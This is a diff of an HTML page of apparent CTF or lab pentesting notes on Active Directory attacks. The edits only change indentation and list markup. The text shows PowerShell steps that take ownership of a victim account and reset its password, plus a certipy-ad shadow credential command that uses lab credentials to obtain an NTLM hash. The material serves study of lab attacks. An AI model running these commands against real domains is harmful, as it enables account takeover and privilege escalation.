@@ -90,7 +90,7 @@
                     <p>To perform this attack you can follow commands that bloodhound provides (more or less becaouse i had to change one a bit)</p>
                     <p>Define our user passwords</p>
                     <pre><code class="language-powershell">$SecPassword = ConvertTo-SecureString 'WqSZAF6CysDQbGb3' -AsPlainText -Force
-    $Cred = New-Object System.Management.Automation.PSCredential('sequel\ryan', $SecPassword)</code></pre>
+$Cred = New-Object System.Management.Automation.PSCredential('sequel\ryan', $SecPassword)</code></pre>
                     <p>Change the owner of our victim user</p>    
                     <pre><code class="language-powershell">Set-DomainObjectOwner -Credential $Cred -Identity VICTIM_USER -OwnerIdentity ATTACKER_USER</code></pre>
                     <p>Change password of the user</p>
@@ -173,8 +173,12 @@
                 </ul>
 
                 <h3>Shadow Credential Attack</h3>
-                <p>Used to escalate privielges. This attack is based on modifying certain attributes of the an AD object to inject a public key in the attribute "msDS-KeyCredentialLink" and then the attacker uses the private key to authenticate as he was the victim. Obtaining a NTLM hash which can be use in pass-the-hass attacks</p>
-                <pre><code class="language-bash">certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'WINRM_SVC' -dc-ip '10.10.11.69'</code></pre>
+                <ul>
+                    <p>Used to escalate privielges. This attack is based on modifying certain attributes of the an AD object to inject a public key in the attribute "msDS-KeyCredentialLink" and then the attacker uses the private key to authenticate as he was the victim. Obtaining a NTLM hash which can be use in pass-the-hass attacks</p>
+                    <pre><code class="language-bash">certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'WINRM_SVC' -dc-ip '10.10.11.69'</code></pre>
+                </ul>
+                
+                
             </ul>        
 
         </div>
